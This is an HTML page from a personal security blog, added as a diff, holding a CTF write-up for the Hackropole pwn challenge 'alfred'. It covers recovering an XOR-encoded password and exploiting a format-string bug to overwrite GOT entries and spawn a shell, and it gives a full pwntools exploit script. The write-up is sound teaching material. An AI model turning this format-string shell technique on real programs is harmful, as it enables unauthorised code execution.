@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>0xb0tm4n&#x27;s website</title>
+  <script src="/js/index.js" defer></script>
+  <script src="/js/prompt.js" defer></script>
+  <script src="/js/keyboard.js" defer></script>
+  <script src="/js/tab.js" defer></script>
+  <script src="/js/commands.js" defer></script>
+  <script src="/js/config.js" defer></script><link rel="stylesheet" href="/css/base.css"><link rel="stylesheet" href="/css/page.css"></head>
+
+<body onkeydown="exec(event)">
+    <main>
+      <div class="files" id="files" tabindex="0">
+<ul><li class="file">
+    <span>├── <a href="https://super-botman.github.io/readme/" tabindex="-2">README</a></span>
+    </li><li class="folder">
+    <span>├── <a href="https://super-botman.github.io/web/" tabindex="-3">Web</a></span>
+    <ul><li class="folder">
+    <span>│   └── <a href="https://super-botman.github.io/web/writeups/" tabindex="-4">Writeups</a></span>
+    <ul><li class="file">
+    <span>│       ├── <a href="https://super-botman.github.io/web/writeups/thomghost/" tabindex="-5">THM | Thomghost</a></span>
+    </li><li class="file">
+    <span>│       └── <a href="https://super-botman.github.io/web/writeups/boiler/" tabindex="-6">THM | Boiler</a></span>
+    </li>
+      </ul>
+    </li>
+      </ul>
+    </li><li class="folder">
+    <span>└── <a href="https://super-botman.github.io/pwn/" tabindex="-7">Pwn</a></span>
+    <ul><li class="folder">
+    <span>    └── <a href="https://super-botman.github.io/pwn/writeups/" tabindex="-8">Writeups</a></span>
+    <ul><li class="file">
+    <span>        ├── <a href="https://super-botman.github.io/pwn/writeups/pwn103/" tabindex="-9">THM | pwn101 task 103</a></span>
+    </li><li class="file">
+    <span>        ├── <a href="https://super-botman.github.io/pwn/writeups/aarchibald/" tabindex="-10">Hackropole | Aarchibald</a></span>
+    </li><li class="file">
+    <span>        ├── <a href="https://super-botman.github.io/pwn/writeups/wsd/" tabindex="-11">FCSC 2026 | wsd</a></span>
+    </li><li class="file">
+    <span>        ├── <a href="https://super-botman.github.io/pwn/writeups/bigorneau/" tabindex="-12">FCSC 2025 | Bigorneau</a></span>
+    </li><li class="file">
+    <span>        ├── <a class="selected" href="https://super-botman.github.io/pwn/writeups/alfred/" tabindex="-13">Hackropole | Alfred</a></span>
+    </li><li class="file">
+    <span>        ├── <a href="https://super-botman.github.io/pwn/writeups/robot/" tabindex="-14">FCSC 2023 | Robot</a></span>
+    </li><li class="file">
+    <span>        ├── <a href="https://super-botman.github.io/pwn/writeups/autodiag/" tabindex="-15">FCSC 2026 | Autodiag</a></span>
+    </li><li class="file">
+    <span>        ├── <a href="https://super-botman.github.io/pwn/writeups/armigo/" tabindex="-16">Hackropole | Armigo</a></span>
+    </li><li class="file">
+    <span>        ├── <a href="https://super-botman.github.io/pwn/writeups/small-prime-shellcode/" tabindex="-17">FCSC 2025 | Small Prime Shellcode</a></span>
+    </li><li class="file">
+    <span>        └── <a href="https://super-botman.github.io/pwn/writeups/http3/" tabindex="-18">FCSC 2025 | HTTP3</a></span>
+    </li>
+      </ul>
+    </li>
+      </ul>
+    </li>
+</ul>
+</div>
+      <div class="viewer page" id="viewer" tabindex="0">
+        <div class="tab">
+<div class="file-manager" onclick='document.getElementById("files").classList.toggle("open"); document.getElementById("content").classList.toggle("close")'> </div>
+<ul id="tabs">
+</ul>
+
+
+</div>
+        <div class="content" id="content"><h1 id="pwn-alfred-hackropole">[Pwn] alfred | hackropole</h1>
+<ul>
+<li><a href="https://super-botman.github.io/pwn/writeups/alfred/#checksec">1. Checksec</a></li>
+<li><a href="https://super-botman.github.io/pwn/writeups/alfred/#writeup">2. Writeup</a></li>
+<li><a href="https://super-botman.github.io/pwn/writeups/alfred/#full-exploit">3. Full exploit</a></li>
+</ul>
+<h2 id="checksec">Checksec</h2>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="shellscript"><span class="giallo-l"><span style="color: #89DDFF;">[*] &#39;</span><span style="color: #9ECE6A;">/home/botman/Documents/cybersec/CTF/solo/hackropole/pwn/alfred/alfred</span><span style="color: #89DDFF;">&#39;</span></span>
+<span class="giallo-l"><span style="color: #C0CAF5;">    Arch:</span><span style="color: #9ECE6A;">     i386-32-little</span></span>
+<span class="giallo-l"><span style="color: #C0CAF5;">    RELRO:</span><span style="color: #9ECE6A;">    Partial RELRO</span></span>
+<span class="giallo-l"><span style="color: #C0CAF5;">    Stack:</span><span style="color: #9ECE6A;">    Canary found</span></span>
+<span class="giallo-l"><span style="color: #C0CAF5;">    NX:</span><span style="color: #9ECE6A;">       NX enabled</span></span>
+<span class="giallo-l"><span style="color: #C0CAF5;">    PIE:</span><span style="color: #9ECE6A;">      No PIE</span><span> (0x8048000)</span></span></code></pre><h2 id="writeup">Writeup</h2>
+<p>We begin with a lill bit of reversing to find the password</p>
+<p><img src="/images/alfred/reverse.png" alt="reverse" /></p>
+<p>We can see a call to <code>system</code> in the function <code>todo\scripts</code> which will may be useful later because our binary is staticelly compiled so we don't have to defeat the libc PIE with a leak.</p>
+<p><img src="/images/alfred/reverse2.png" alt="reverse" /></p>
+<p>We see that the input is simply XORed and then compared with a strange value which is our password encrypted so we just have to find the key and XOR it with the password so we can just break when the encryption happens to get the key</p>
+<p><img src="/images/alfred/xor_key.png" alt="xor key" /></p>
+<p>We get the key which is 0x35 and with <a rel="external" href="https://gchq.github.io/CyberChef/">cyberchef</a> we find the password which is <code>Alma_and_Pat</code> so we can continue the challenge and rapidly find a format string</p>
+<p><img src="/images/alfred/fmtstr.png" alt="format string" /></p>
+<p>So we will be able to rewrite the GOT of our binary to get a shell with the system function but a there is a lill problem, we cannot call any function with the value that we want so we have to loop on <code>todo_script</code> so let's have a closer look to this function</p>
+<p><img src="/images/alfred/reverse3.png" alt="reverse" /></p>
+<p>We see two interesting functions, printf to exec our shell and putc to loop so we're gonna replace the printf GOT value by the address of system and the putc GOT value by our <code>todo_script</code> addresse</p>
+<p><img src="/images/alfred/shell.png" alt="shell" /></p>
+<p>So we gain the shell but we still have to get the flag, so we're gonna use <code>base64</code> soft to get the pdf content and then <code>pdftotext</code> and tadaaa</p>
+<p><img src="/images/alfred/flag.png" alt="flag" /></p>
+<h2 id="full-exploit">Full exploit</h2>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="python"><span class="giallo-l"><span style="color: #7DCFFF;">from</span><span> pwn</span><span style="color: #7DCFFF;"> import</span><span style="color: #89DDFF;"> *</span></span>
+<span class="giallo-l"><span style="color: #7DCFFF;">import</span><span> pdftotext</span></span>
+<span class="giallo-l"><span style="color: #7DCFFF;">import</span><span> base64</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">def</span><span style="color: #7AA2F7;"> exploit</span><span style="color: #9ABDF5;">(</span><span style="color: #E0AF68;">io</span><span style="color: #89DDFF;">,</span><span style="color: #E0AF68;"> elf</span><span style="color: #89DDFF;">,</span><span style="color: #E0AF68;"> libc</span><span style="color: #89DDFF;">=</span><span style="color: #FF9E64;">None</span><span style="color: #9ABDF5;">):</span></span>
+<span class="giallo-l"><span>    io</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">sendlineafter</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">&gt;&gt;&gt; </span><span style="color: #89DDFF;">&#39;,</span><span style="color: #BB9AF7;"> b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">Alma_and_Pat</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>    offset</span><span style="color: #89DDFF;"> =</span><span style="color: #FF9E64;"> 7</span></span>
+<span class="giallo-l"><span>    writes</span><span style="color: #89DDFF;"> = {</span></span>
+<span class="giallo-l"><span>            elf</span><span style="color: #89DDFF;">.</span><span>got</span><span style="color: #9ABDF5;">[</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">putc</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">]</span><span style="color: #89DDFF;">:</span><span> elf</span><span style="color: #89DDFF;">.</span><span>sym</span><span style="color: #9ABDF5;">[</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">todo_scripts</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">]</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span>            elf</span><span style="color: #89DDFF;">.</span><span>got</span><span style="color: #9ABDF5;">[</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">printf</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">]</span><span style="color: #89DDFF;">:</span><span> elf</span><span style="color: #89DDFF;">.</span><span>sym</span><span style="color: #9ABDF5;">[</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">system</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">]</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">    }</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>    payload</span><span style="color: #89DDFF;"> =</span><span style="color: #7AA2F7;"> fmtstr_payload</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">offset</span><span style="color: #89DDFF;">,</span><span style="color: #C0CAF5;"> writes</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>    io</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">sendlineafter</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">&gt;&gt;&gt; </span><span style="color: #89DDFF;">&#39;,</span><span style="color: #C0CAF5;"> payload</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>    io</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">sendline</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">/bin/sh</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>    io</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">recvuntil</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">sh: 1: Hello: not found</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    read_files</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">script_flag.pdf</span><span style="color: #89DDFF;">&#39;,</span><span style="color: #C0CAF5;"> io</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">def</span><span style="color: #7AA2F7;"> read_files</span><span style="color: #9ABDF5;">(</span><span style="color: #E0AF68;">file</span><span style="color: #89DDFF;">,</span><span style="color: #E0AF68;"> io</span><span style="color: #9ABDF5;">):</span></span>
+<span class="giallo-l"><span>    io</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">sendline</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">f</span><span style="color: #9ECE6A;">&#39;base64 </span><span style="color: #BB9AF7;">{</span><span style="color: #C0CAF5;">file</span><span style="color: #BB9AF7;">}</span><span style="color: #9ECE6A;">&#39;</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">encode</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">utf-8</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">))</span></span>
+<span class="giallo-l"><span>    flag</span><span style="color: #89DDFF;"> =</span><span> io</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">recvuntil</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">==</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>    flag</span><span style="color: #89DDFF;"> =</span><span> base64</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">b64decode</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">flag</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">replace</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&#39;\n&#39;,</span><span style="color: #BB9AF7;"> b</span><span style="color: #89DDFF;">&#39;&#39;</span><span style="color: #9ABDF5;">))</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">    with</span><span style="color: #0DB9D7;"> open</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">flag.pdf</span><span style="color: #89DDFF;">&#39;, &#39;</span><span style="color: #9ECE6A;">w+b</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span><span style="color: #BB9AF7;"> as</span><span> f</span><span style="color: #89DDFF;">:</span></span>
+<span class="giallo-l"><span>        f</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">write</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">flag</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>    </span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">    with</span><span style="color: #0DB9D7;"> open</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">flag.pdf</span><span style="color: #89DDFF;">&#39;, &#39;</span><span style="color: #9ECE6A;">rb</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span><span style="color: #BB9AF7;"> as</span><span> f</span><span style="color: #89DDFF;">:</span></span>
+<span class="giallo-l"><span>        flag</span><span style="color: #89DDFF;"> =</span><span> pdftotext</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">PDF</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">f</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>        io</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">success</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">f</span><span style="color: #9ECE6A;">&#39;flag: </span><span style="color: #BB9AF7;">{</span><span style="color: #89DDFF;">(&quot;&quot;.</span><span style="color: #7AA2F7;">join</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">flag</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">).</span><span style="color: #7AA2F7;">replace</span><span style="color: #9ABDF5;">(</span><span style="color: #0DB9D7;">chr</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">0x</span><span style="color: #FF9E64;">a</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">, &quot;&quot;</span><span style="color: #9ABDF5;">)</span><span style="color: #BB9AF7;">}</span><span style="color: #9ECE6A;">&#39;</span><span style="color: #9ABDF5;">)</span></span></code></pre>
+<p><a href="/exploits/alfred.py">download here</a></p>
+<p><strong>Writed by <em>0xB0tm4n</em></strong></p>
+
+        </div>
+      </div>
+      <div class="prompt" id="terminal"><input
+    type="text"
+    id="setter"
+    onkeydown="writeit(this, event);moveIt(this.value.length, event)"
+    onchange="writeit(this, event)"
+    onkeyup="writeit(this, event)"
+    onkeypress="writeit(this, event);"
+    >
+<label for="setter" id="writer"> </label><b class="cursor" id="cursor"></b></div>
+    </main>
+  </body>
+
+</html>
